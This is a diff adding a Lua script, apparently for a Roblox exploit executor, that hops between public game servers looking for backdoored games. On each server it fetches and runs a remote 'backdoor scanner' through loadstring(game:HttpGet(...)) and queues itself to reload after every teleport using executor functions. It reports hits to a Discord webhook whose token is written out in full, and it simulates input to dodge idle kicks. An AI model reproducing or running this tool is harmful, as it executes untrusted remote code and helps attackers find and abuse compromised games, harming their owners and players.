@@ -1,0 +1,826 @@
+local success_text = "No backdoored"
+local script_url   = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
+local self_url     = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/egro5"
+local webhook_url  = "https://discord.com/api/webhooks/1487289258845802576/dXwi8nw8ptZZNEfWQiVLmBmNs0uSXGOXNRAR8cV_nDlDVJtSuDumUJlYB7_SEzVKiFqx"
+
+-- ══════════════════════════════════════════
+--  SERVICES
+-- ══════════════════════════════════════════
+local Log    = game:GetService("LogService")
+local TP     = game:GetService("TeleportService")
+local Http   = game:GetService("HttpService")
+local CG     = game:GetService("CoreGui")
+local Plrs   = game:GetService("Players")
+local MPS    = game:GetService("MarketplaceService")
+local Stats  = game:GetService("Stats")
+local TW     = game:GetService("TweenService")
+local UIS    = game:GetService("UserInputService")
+local LP     = Plrs.LocalPlayer
+
+-- ══════════════════════════════════════════
+--  STATE
+-- ══════════════════════════════════════════
+local found   = false
+local done    = false
+local hops    = 0
+local scans   = 0
+local cursor  = ""
+local sort    = "Asc"
+local dbName  = "TitanDB_v35.json"
+local jobId   = tostring(game.JobId)
+local placeId = game.PlaceId
+local hour    = os.date("!*t").hour
+local AllIDs  = {}
+local tStart  = os.time()
+local gameName= "..."
+local logCount= 0
+local MAX_LOG = 60
+
+pcall(function() gameName = MPS:GetProductInfo(tonumber(placeId)).Name end)
+
+task.spawn(function()
+    local VU = game:GetService("VirtualUser")
+    LP.Idled:Connect(function()
+        pcall(function() VU:CaptureController() VU:ClickButton2(Vector2.new()) end)
+    end)
+end)
+
+pcall(function()
+    local old = CG:FindFirstChild("_TitanV35")
+    if old then old:Destroy() end
+end)
+
+-- ══════════════════════════════════════════
+--  HELPERS
+-- ══════════════════════════════════════════
+local function elapsed()
+    local s = os.time() - tStart
+    return ("%02d:%02d:%02d"):format(math.floor(s/3600), math.floor(s/60)%60, s%60)
+end
+
+local function tw(obj, props, t, st, dir)
+    TW:Create(obj, TweenInfo.new(t or .25, st or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out), props):Play()
+end
+
+local function make(cls, props, par)
+    local o = Instance.new(cls)
+    for k,v in pairs(props) do o[k]=v end
+    if par then o.Parent=par end
+    return o
+end
+
+local function corner(r,p) return make("UICorner",{CornerRadius=UDim.new(0,r)},p) end
+local function stroke(c,t,p)
+    return make("UIStroke",{Color=c,Thickness=t,ApplyStrokeMode=Enum.ApplyStrokeMode.Border},p)
+end
+
+-- ══════════════════════════════════════════
+--  COLORS
+-- ══════════════════════════════════════════
+local A  = Color3.fromRGB(0,255,140)
+local AD = Color3.fromRGB(0,120,70)
+local AK = Color3.fromRGB(0,22,14)
+local BG = Color3.fromRGB(3,4,5)
+local P1 = Color3.fromRGB(9,11,13)
+local P2 = Color3.fromRGB(14,16,20)
+local BD = Color3.fromRGB(28,32,38)
+local WH = Color3.fromRGB(220,225,230)
+local MU = Color3.fromRGB(80,90,100)
+local RE = Color3.fromRGB(255,50,50)
+local OR = Color3.fromRGB(255,165,0)
+local BL = Color3.fromRGB(30,150,255)
+local CY = Color3.fromRGB(0,220,255)
+
+-- ══════════════════════════════════════════
+--  ROOT GUI
+-- ══════════════════════════════════════════
+local sg = make("ScreenGui",{
+    Name="_TitanV35",
+    ResetOnSpawn=false,
+    ZIndexBehavior=Enum.ZIndexBehavior.Sibling,
+    DisplayOrder=999,
+    IgnoreGuiInset=true,
+},CG)
+
+local W,H = 540,640
+
+local mf = make("Frame",{
+    Name="Main",
+    Size=UDim2.new(0,W,0,48),  -- starts small for boot anim
+    Position=UDim2.new(1,-(W+24),1,-(H+24)),
+    BackgroundColor3=BG,
+    BackgroundTransparency=1,
+    BorderSizePixel=0,
+    Active=true,
+    Draggable=false,
+    ClipsDescendants=true,
+},sg)
+corner(18,mf)
+local mStroke = stroke(A,2,mf)
+
+-- ══════════════════════════════════════════
+--  GLOW BLOBS (animated background)
+-- ══════════════════════════════════════════
+local function glow(xA,yA,xB,yB,col)
+    local g = make("Frame",{
+        Size=UDim2.new(0,200,0,200),
+        Position=UDim2.new(xA,0,yA,0),
+        BackgroundColor3=col,
+        BackgroundTransparency=0.92,
+        BorderSizePixel=0,
+        ZIndex=1,
+    },mf)
+    corner(100,g)
+    task.spawn(function()
+        while true do
+            tw(g,{BackgroundTransparency=0.88,Position=UDim2.new(xA,0,yA,0)},3.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut)
+            task.wait(3.5)
+            tw(g,{BackgroundTransparency=0.94,Position=UDim2.new(xB,0,yB,0)},3.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut)
+            task.wait(3.5)
+        end
+    end)
+    return g
+end
+
+glow(-0.15,-0.15, -0.05,-0.08, A)
+glow(0.65,0.55,   0.70,0.60,   BL)
+glow(0.30,0.70,   0.25,0.65,   CY)
+
+-- ══════════════════════════════════════════
+--  HEADER
+-- ══════════════════════════════════════════
+local hdr = make("Frame",{
+    Size=UDim2.new(1,0,0,72),
+    BackgroundColor3=P1,
+    BorderSizePixel=0,
+    ZIndex=3,
+},mf)
+corner(18,hdr)
+make("Frame",{Size=UDim2.new(1,0,0,18),Position=UDim2.new(0,0,1,-18),BackgroundColor3=P1,BorderSizePixel=0,ZIndex=3},hdr)
+
+-- animated accent stripe
+local stripe = make("Frame",{
+    Size=UDim2.new(0,3,0,0),
+    Position=UDim2.new(0,16,0.5,0),
+    BackgroundColor3=A,
+    BorderSizePixel=0,
+    ZIndex=5,
+},hdr)
+corner(2,stripe)
+
+make("TextLabel",{
+    Size=UDim2.new(0,260,0,30),
+    Position=UDim2.new(0,28,0,10),
+    Text="TITAN",
+    TextColor3=A,
+    BackgroundTransparency=1,
+    Font=Enum.Font.GothamBlack,
+    TextSize=28,
+    TextXAlignment=Enum.TextXAlignment.Left,
+    ZIndex=4,
+},hdr)
+
+make("TextLabel",{
+    Size=UDim2.new(0,220,0,16),
+    Position=UDim2.new(0,29,0,42),
+    Text="v35.0  ·  SERVER HOP SCANNER",
+    TextColor3=MU,
+    BackgroundTransparency=1,
+    Font=Enum.Font.GothamSemibold,
+    TextSize=9,
+    TextXAlignment=Enum.TextXAlignment.Left,
+    ZIndex=4,
+},hdr)
+
+local uptL = make("TextLabel",{
+    Size=UDim2.new(0,130,0,16),
+    Position=UDim2.new(1,-190,0,16),
+    Text="00:00:00",
+    TextColor3=MU,
+    BackgroundTransparency=1,
+    Font=Enum.Font.Code,
+    TextSize=11,
+    TextXAlignment=Enum.TextXAlignment.Right,
+    ZIndex=4,
+},hdr)
+
+local minB = make("TextButton",{
+    Size=UDim2.new(0,34,0,34),
+    Position=UDim2.new(1,-48,0.5,-17),
+    BackgroundColor3=P2,
+    Text="−",
+    TextColor3=WH,
+    Font=Enum.Font.GothamBold,
+    TextSize=20,
+    BorderSizePixel=0,
+    ZIndex=5,
+},hdr)
+corner(8,minB)
+stroke(BD,1,minB)
+
+-- ══════════════════════════════════════════
+--  STATUS PILL
+-- ══════════════════════════════════════════
+local sPill = make("Frame",{
+    Size=UDim2.new(1,-32,0,36),
+    Position=UDim2.new(0,16,0,82),
+    BackgroundColor3=AK,
+    BorderSizePixel=0,
+    ZIndex=3,
+},mf)
+corner(10,sPill)
+local sPillStroke = stroke(A,1,sPill)
+
+local sDot = make("Frame",{
+    Size=UDim2.new(0,9,0,9),
+    Position=UDim2.new(0,13,0.5,-4),
+    BackgroundColor3=A,
+    BorderSizePixel=0,
+    ZIndex=4,
+},sPill)
+corner(5,sDot)
+
+local sLabel = make("TextLabel",{
+    Size=UDim2.new(1,-90,1,0),
+    Position=UDim2.new(0,30,0,0),
+    Text="INITIALIZING...",
+    TextColor3=A,
+    BackgroundTransparency=1,
+    Font=Enum.Font.GothamBold,
+    TextSize=11,
+    TextXAlignment=Enum.TextXAlignment.Left,
+    ZIndex=4,
+},sPill)
+
+local sTimer = make("TextLabel",{
+    Size=UDim2.new(0,75,1,0),
+    Position=UDim2.new(1,-80,0,0),
+    Text="",
+    TextColor3=AD,
+    BackgroundTransparency=1,
+    Font=Enum.Font.Code,
+    TextSize=10,
+    TextXAlignment=Enum.TextXAlignment.Right,
+    ZIndex=4,
+},sPill)
+
+task.spawn(function()
+    while true do
+        tw(sDot,{BackgroundTransparency=0.7},0.5,Enum.EasingStyle.Sine)
+        task.wait(0.5)
+        tw(sDot,{BackgroundTransparency=0},0.5,Enum.EasingStyle.Sine)
+        task.wait(0.5)
+    end
+end)
+
+-- ══════════════════════════════════════════
+--  STAT CARDS (manual placement — NO UIGridLayout)
+-- ══════════════════════════════════════════
+local COLS    = 3
+local GAP     = 8
+local CARD_W  = math.floor((W - 32 - GAP*(COLS-1)) / COLS)
+local CARD_H  = 56
+local CARDS_Y = 130
+
+local statVals = {}
+local statDefs = {
+    {k="ping",  lbl="PING",     val="0 ms",   col=BL,  row=0, col_=0},
+    {k="hops",  lbl="HOPS",     val="0",       col=A,   row=0, col_=1},
+    {k="scans", lbl="SCANS",    val="0",       col=OR,  row=0, col_=2},
+    {k="db",    lbl="DATABASE", val="0 svrs",  col=MU,  row=1, col_=0},
+    {k="sort",  lbl="SORT",     val="ASC",     col=OR,  row=1, col_=1},
+    {k="game",  lbl="GAME",     val="...",     col=WH,  row=1, col_=2},
+}
+
+for _,d in ipairs(statDefs) do
+    local xPos = 16 + d.col_*(CARD_W + GAP)
+    local yPos = CARDS_Y + d.row*(CARD_H + GAP)
+
+    local card = make("Frame",{
+        Size=UDim2.new(0,CARD_W,0,CARD_H),
+        Position=UDim2.new(0,xPos,0,yPos+24),
+        BackgroundColor3=P1,
+        BackgroundTransparency=1,
+        BorderSizePixel=0,
+        ZIndex=3,
+    },mf)
+    corner(10,card)
+    stroke(BD,1,card)
+
+    make("TextLabel",{
+        Size=UDim2.new(1,-10,0,14),
+        Position=UDim2.new(0,10,0,8),
+        Text=d.lbl,
+        TextColor3=MU,
+        BackgroundTransparency=1,
+        Font=Enum.Font.GothamSemibold,
+        TextSize=8,
+        TextXAlignment=Enum.TextXAlignment.Left,
+        ZIndex=4,
+    },card)
+
+    local vl = make("TextLabel",{
+        Size=UDim2.new(1,-10,0,22),
+        Position=UDim2.new(0,10,0,27),
+        Text=d.val,
+        TextColor3=d.col,
+        BackgroundTransparency=1,
+        Font=Enum.Font.GothamBold,
+        TextSize=14,
+        TextXAlignment=Enum.TextXAlignment.Left,
+        ZIndex=4,
+    },card)
+    statVals[d.k] = vl
+
+    -- staggered slide-in
+    local delay = 0.3 + (d.col_ + d.row*COLS)*0.06
+    task.delay(delay, function()
+        tw(card,{BackgroundTransparency=0, Position=UDim2.new(0,xPos,0,yPos)},0.45,Enum.EasingStyle.Back)
+    end)
+end
+
+-- ══════════════════════════════════════════
+--  PROGRESS BAR
+-- ══════════════════════════════════════════
+local PB_Y = CARDS_Y + CARD_H*2 + GAP*2 + 10
+
+local pbOuter = make("Frame",{
+    Size=UDim2.new(1,-32,0,20),
+    Position=UDim2.new(0,16,0,PB_Y),
+    BackgroundColor3=P2,
+    BorderSizePixel=0,
+    ZIndex=3,
+},mf)
+corner(6,pbOuter)
+stroke(BD,1,pbOuter)
+
+local pbFill = make("Frame",{
+    Size=UDim2.new(0,0,1,0),
+    BackgroundColor3=A,
+    BorderSizePixel=0,
+    ZIndex=4,
+},pbOuter)
+corner(6,pbFill)
+
+-- shimmer effect
+local shimmer = make("Frame",{
+    Size=UDim2.new(0,50,1,0),
+    Position=UDim2.new(-0.1,0,0,0),
+    BackgroundColor3=Color3.new(1,1,1),
+    BackgroundTransparency=0.8,
+    BorderSizePixel=0,
+    ZIndex=5,
+},pbFill)
+
+task.spawn(function()
+    while true do
+        tw(shimmer,{Position=UDim2.new(1.1,0,0,0)},1.4,Enum.EasingStyle.Linear)
+        task.wait(1.8)
+        shimmer.Position=UDim2.new(-0.1,0,0,0)
+    end
+end)
+
+local pbLabel = make("TextLabel",{
+    Size=UDim2.new(1,0,1,0),
+    BackgroundTransparency=1,
+    Text="READY",
+    TextColor3=Color3.new(1,1,1),
+    Font=Enum.Font.GothamBold,
+    TextSize=9,
+    ZIndex=6,
+},pbOuter)
+
+-- ══════════════════════════════════════════
+--  LOG PANEL
+-- ══════════════════════════════════════════
+local LOG_Y = PB_Y + 30
+local LOG_H = H - LOG_Y - 60
+
+local logFrame = make("Frame",{
+    Size=UDim2.new(1,-32,0,LOG_H),
+    Position=UDim2.new(0,16,0,LOG_Y),
+    BackgroundColor3=P1,
+    BorderSizePixel=0,
+    ZIndex=3,
+},mf)
+corner(12,logFrame)
+stroke(BD,1,logFrame)
+
+local logHdr = make("Frame",{
+    Size=UDim2.new(1,0,0,26),
+    BackgroundColor3=P2,
+    BorderSizePixel=0,
+    ZIndex=4,
+},logFrame)
+corner(12,logHdr)
+make("Frame",{Size=UDim2.new(1,0,0,12),Position=UDim2.new(0,0,1,-12),BackgroundColor3=P2,BorderSizePixel=0,ZIndex=4},logHdr)
+
+make("TextLabel",{
+    Size=UDim2.new(0.5,0,1,0),
+    Position=UDim2.new(0,14,0,0),
+    Text="▸  ACTIVITY LOG",
+    TextColor3=MU,
+    BackgroundTransparency=1,
+    Font=Enum.Font.GothamBold,
+    TextSize=9,
+    TextXAlignment=Enum.TextXAlignment.Left,
+    ZIndex=5,
+},logHdr)
+
+local logCntL = make("TextLabel",{
+    Size=UDim2.new(0,80,1,0),
+    Position=UDim2.new(1,-88,0,0),
+    Text="0 lines",
+    TextColor3=MU,
+    BackgroundTransparency=1,
+    Font=Enum.Font.Code,
+    TextSize=9,
+    TextXAlignment=Enum.TextXAlignment.Right,
+    ZIndex=5,
+},logHdr)
+
+local logScroll = make("ScrollingFrame",{
+    Size=UDim2.new(1,0,1,-26),
+    Position=UDim2.new(0,0,0,26),
+    BackgroundTransparency=1,
+    BorderSizePixel=0,
+    ScrollBarThickness=3,
+    ScrollBarImageColor3=AD,
+    CanvasSize=UDim2.new(0,0,0,0),
+    ZIndex=4,
+},logFrame)
+
+make("UIPadding",{
+    PaddingLeft=UDim.new(0,8),
+    PaddingRight=UDim.new(0,8),
+    PaddingTop=UDim.new(0,4),
+},logScroll)
+
+local logLL = make("UIListLayout",{
+    Padding=UDim.new(0,2),
+    SortOrder=Enum.SortOrder.LayoutOrder,
+},logScroll)
+
+-- ══════════════════════════════════════════
+--  BUTTONS
+-- ══════════════════════════════════════════
+local BTN_Y = H - 52
+local BTN_W = (W - 32 - 10) / 2
+
+local function mkBtn(txt, col, bCol, xOff)
+    local b = make("TextButton",{
+        Size=UDim2.new(0,BTN_W,0,40),
+        Position=UDim2.new(0,16+xOff,0,BTN_Y),
+        BackgroundColor3=col,
+        Text=txt,
+        TextColor3=WH,
+        Font=Enum.Font.GothamBold,
+        TextSize=11,
+        BorderSizePixel=0,
+        ZIndex=3,
+    },mf)
+    corner(10,b)
+    stroke(bCol,1,b)
+    return b
+end
+
+local resetB = mkBtn("⚠  WIPE DB",    Color3.fromRGB(100,20,20), Color3.fromRGB(180,35,35), 0)
+local hopB   = mkBtn("⚡  FORCE HOP", Color3.fromRGB(12,65,130), BL,                        BTN_W+10)
+
+local function btnHov(b, on, off)
+    b.MouseEnter:Connect(function() tw(b,{BackgroundColor3=on},0.15) end)
+    b.MouseLeave:Connect(function() tw(b,{BackgroundColor3=off},0.15) end)
+end
+btnHov(resetB, RE,  Color3.fromRGB(100,20,20))
+btnHov(hopB,   BL,  Color3.fromRGB(12,65,130))
+btnHov(minB,   BD,  P2)
+
+-- ══════════════════════════════════════════
+--  CORE FUNCTIONS
+-- ══════════════════════════════════════════
+local function setStatus(txt, col)
+    sLabel.Text = txt
+    sLabel.TextColor3 = col or A
+    sDot.BackgroundColor3 = col or A
+    mStroke.Color = col or A
+    sPillStroke.Color = col or A
+end
+
+local function updCard(k, v, col)
+    if not statVals[k] then return end
+    statVals[k].Text = tostring(v)
+    if col then statVals[k].TextColor3 = col end
+end
+
+local logIdx = 0
+local function AddLog(msg, col)
+    logIdx = logIdx + 1
+    logCount = logCount + 1
+
+    local children = logScroll:GetChildren()
+    local cnt = 0
+    for _,c in ipairs(children) do if c:IsA("TextLabel") then cnt=cnt+1 end end
+    if cnt >= MAX_LOG then
+        for _,c in ipairs(logScroll:GetChildren()) do
+            if c:IsA("TextLabel") then c:Destroy() break end
+        end
+    end
+
+    local l = make("TextLabel",{
+        Size=UDim2.new(1,0,0,15),
+        BackgroundTransparency=1,
+        Text=os.date("%X").."  "..msg,
+        TextColor3=col or WH,
+        Font=Enum.Font.Code,
+        TextSize=10,
+        TextXAlignment=Enum.TextXAlignment.Left,
+        LayoutOrder=logIdx,
+        TextTransparency=1,
+        ZIndex=5,
+    },logScroll)
+
+    tw(l,{TextTransparency=0},0.25)
+    logScroll.CanvasSize = UDim2.new(0,0,0,logLL.AbsoluteContentSize.Y+12)
+    logScroll.CanvasPosition = Vector2.new(0,logLL.AbsoluteContentSize.Y)
+    logCntL.Text = logCount.." lines"
+end
+
+-- ══════════════════════════════════════════
+--  DATABASE
+-- ══════════════════════════════════════════
+local function SaveDB()
+    pcall(function() writefile(dbName, Http:JSONEncode(AllIDs)) end)
+    updCard("db", #AllIDs.." svrs")
+end
+
+local function LoadDB()
+    local ok,r = pcall(function() return Http:JSONDecode(readfile(dbName)) end)
+    if ok and type(r)=="table" then
+        if r[1]~=hour then
+            AllIDs={hour} SaveDB() AddLog("NEW SESSION — DB RESET",OR)
+        else
+            AllIDs=r AddLog("DB LOADED: "..(#AllIDs-1).." entries",AD)
+        end
+    else
+        AllIDs={hour} SaveDB() AddLog("DB CREATED FRESH",MU)
+    end
+    updCard("db", #AllIDs.." svrs")
+end
+
+-- ══════════════════════════════════════════
+--  MINIMIZE
+-- ══════════════════════════════════════════
+local mini = false
+minB.MouseButton1Click:Connect(function()
+    mini = not mini
+    if mini then
+        tw(mf,{Size=UDim2.new(0,W,0,72)},0.3,Enum.EasingStyle.Quart)
+        minB.Text="+"
+    else
+        tw(mf,{Size=UDim2.new(0,W,0,H)},0.4,Enum.EasingStyle.Back)
+        minB.Text="−"
+    end
+end)
+
+-- ══════════════════════════════════════════
+--  RESET BUTTON
+-- ══════════════════════════════════════════
+local rStage = 0
+resetB.MouseButton1Click:Connect(function()
+    if rStage==0 then
+        rStage=1
+        resetB.Text="CONFIRM WIPE?"
+        tw(resetB,{BackgroundColor3=OR},0.2)
+        task.delay(4,function()
+            if rStage==1 then
+                rStage=0
+                resetB.Text="⚠  WIPE DB"
+                tw(resetB,{BackgroundColor3=Color3.fromRGB(100,20,20)},0.2)
+            end
+        end)
+    else
+        rStage=0
+        AllIDs={hour} SaveDB()
+        resetB.Text="✓  WIPED"
+        tw(resetB,{BackgroundColor3=AK},0.2)
+        AddLog("DATABASE PURGED",OR)
+        task.wait(2)
+        resetB.Text="⚠  WIPE DB"
+        tw(resetB,{BackgroundColor3=Color3.fromRGB(100,20,20)},0.2)
+    end
+end)
+
+-- ══════════════════════════════════════════
+--  SERVER HOP
+-- ══════════════════════════════════════════
+local hopping = false
+local function doHop()
+    if hopping then return end
+    hopping = true
+    setStatus("SEARCHING SERVERS...", BL)
+
+    local q = (syn and syn.queue_on_teleport)
+           or (queue_on_teleport)
+           or (fluxus and fluxus.queue_on_teleport)
+
+    if q then
+        local ok,src = pcall(function() return game:HttpGet(self_url) end)
+        if ok and src and #src > 10 then
+            pcall(function() q(src) end)
+            AddLog("QUEUED SELF OK",AD)
+        else
+            AddLog("SELF-FETCH FAIL — NO QUEUE",RE)
+        end
+    else
+        AddLog("NO QUEUE FUNCTION FOUND",RE)
+    end
+
+    local api = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder="..sort.."&limit=100"
+    if cursor~="" then api=api.."&cursor="..cursor end
+
+    local ok2,resp = pcall(function() return game:HttpGet(api) end)
+    if not ok2 or not resp then
+        AddLog("API FETCH FAILED",RE) hopping=false return
+    end
+
+    local site
+    pcall(function() site=Http:JSONDecode(resp) end)
+    if not site or not site.data or #site.data==0 then
+        AddLog("NO DATA — FLIPPING SORT",OR)
+        cursor="" sort=(sort=="Asc" and "Desc" or "Asc")
+        updCard("sort", sort=="Asc" and "ASC" or "DESC")
+        hopping=false return
+    end
+
+    if site.nextPageCursor and site.nextPageCursor~="null" then
+        cursor=site.nextPageCursor
+    else
+        cursor="" sort=(sort=="Asc" and "Desc" or "Asc")
+        updCard("sort", sort=="Asc" and "ASC" or "DESC")
+    end
+
+    for _,v in pairs(site.data) do
+        local ID = tostring(v.id)
+        local canHop = true
+        if tonumber(v.maxPlayers)>tonumber(v.playing) and ID~=jobId then
+            for i,e in ipairs(AllIDs) do
+                if i>1 and ID==tostring(e) then canHop=false break end
+            end
+            if canHop then
+                table.insert(AllIDs,ID)
+                SaveDB()
+                hops=hops+1
+                updCard("hops",hops,A)
+                AddLog("HOP → "..v.playing.."/"..v.maxPlayers.." players",A)
+                setStatus("TELEPORTING...",CY)
+                -- flash cyan
+                tw(mStroke,{Color=CY,Thickness=4},0.1)
+                task.delay(0.4,function() tw(mStroke,{Color=A,Thickness=2},0.6) end)
+                pcall(function() TP:TeleportToPlaceInstance(placeId,ID,LP) end)
+                task.wait(10)
+                break
+            else
+                AddLog("SKIP (seen): "..string.sub(ID,1,14),MU)
+            end
+        end
+    end
+    hopping=false
+end
+
+hopB.MouseButton1Click:Connect(function() task.spawn(doHop) end)
+
+-- ══════════════════════════════════════════
+--  PING + UPTIME LOOP
+-- ══════════════════════════════════════════
+task.spawn(function()
+    while task.wait(1) do
+        pcall(function()
+            local p = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+            local col = p<80 and A or p<150 and OR or RE
+            updCard("ping",p.." ms",col)
+        end)
+        uptL.Text = elapsed()
+    end
+end)
+
+-- ══════════════════════════════════════════
+--  BOOT ANIMATION
+-- ══════════════════════════════════════════
+task.spawn(function()
+    -- stripe slide down
+    tw(stripe,{Size=UDim2.new(0,3,0,44),Position=UDim2.new(0,16,0.5,-22)},0.5,Enum.EasingStyle.Back)
+    task.wait(0.2)
+    tw(mf,{BackgroundTransparency=0,Size=UDim2.new(0,W,0,H)},0.7,Enum.EasingStyle.Back)
+end)
+
+-- ══════════════════════════════════════════
+--  START SEQUENCE
+-- ══════════════════════════════════════════
+LoadDB()
+updCard("game", string.sub(gameName,1,14), WH)
+
+setStatus("SCANNING...", OR)
+AddLog("TITAN v35 STARTED",A)
+AddLog("TARGET PHRASE: "..success_text,MU)
+AddLog("EXECUTING SCRIPT...",WH)
+scans=scans+1
+updCard("scans",scans)
+
+local obs = Log.MessageOut:Connect(function(m)
+    local low = m:lower()
+    if string.find(low,success_text:lower(),1,true) then
+        found=true
+        AddLog("✓ TRIGGERED: "..string.sub(m,1,38),A)
+    end
+    if string.find(low,"complete",1,true) or string.find(low,"finished",1,true) then
+        done=true
+    end
+end)
+
+pcall(function() loadstring(game:HttpGet(script_url))() end)
+
+-- ══════════════════════════════════════════
+--  SCAN TIMER
+-- ══════════════════════════════════════════
+local waited = 0
+local MAX    = 40
+while waited < MAX do
+    if found then break end
+    if done and waited > 5 then break end
+    waited = waited + 1
+    local pct = waited/MAX
+    tw(pbFill,{Size=UDim2.new(pct,0,1,0)},0.9,Enum.EasingStyle.Quart)
+    pbLabel.Text = "SCANNING  "..waited.." / "..MAX.."s"
+    sTimer.Text  = (MAX-waited).."s"
+    task.wait(1)
+end
+obs:Disconnect()
+tw(pbFill,{Size=UDim2.new(1,0,1,0)},0.3)
+pbLabel.Text = "SCAN COMPLETE"
+sTimer.Text  = ""
+
+-- ══════════════════════════════════════════
+--  RESULT
+-- ══════════════════════════════════════════
+if found then
+    setStatus("TRIGGERED — HOPPING LOOP", A)
+    mf.Draggable = true  -- unlock drag only now
+    AddLog("SUCCESS — ENTERING HOP LOOP", A)
+
+    -- success flash sequence
+    task.spawn(function()
+        for i=1,5 do
+            tw(mStroke,{Color=CY,Thickness=5},0.12)
+            task.wait(0.12)
+            tw(mStroke,{Color=A,Thickness=2},0.12)
+            task.wait(0.12)
+        end
+    end)
+
+    if webhook_url~="" then
+        pcall(function()
+            local req=(syn and syn.request) or (http and http.request) or http_request
+            req({
+                Url=webhook_url, Method="POST",
+                Headers={["Content-Type"]="application/json"},
+                Body=Http:JSONEncode({username="Titan v35",embeds={{
+                    title="✅ TRIGGERED",color=65430,
+                    fields={{name="Game",value=gameName},{name="Hops",value=tostring(hops)}}
+                }}}),
+            })
+        end)
+    end
+
+    while task.wait(1) do
+        pcall(doHop)
+    end
+else
+    setStatus("NOT FOUND — STAYING", RE)
+    mStroke.Color = RE
+    sDot.BackgroundColor3 = RE
+    AddLog("TRIGGER NOT FOUND. STAYING IN SERVER.", RE)
+
+    -- red pulse
+    task.spawn(function()
+        for i=1,6 do
+            tw(mStroke,{Color=Color3.fromRGB(255,80,80),Thickness=4},0.18)
+            task.wait(0.18)
+            tw(mStroke,{Color=RE,Thickness=2},0.18)
+            task.wait(0.18)
+        end
+    end)
+
+    if webhook_url~="" then
+        pcall(function()
+            local req=(syn and syn.request) or (http and http.request) or http_request
+            req({
+                Url=webhook_url, Method="POST",
+                Headers={["Content-Type"]="application/json"},
+                Body=Http:JSONEncode({username="Titan v35",embeds={{
+                    title="❌ NOT FOUND",color=16711680,
+                    fields={{name="Game",value=gameName}}
+                }}}),
+            })
+        end)
+    end
+end
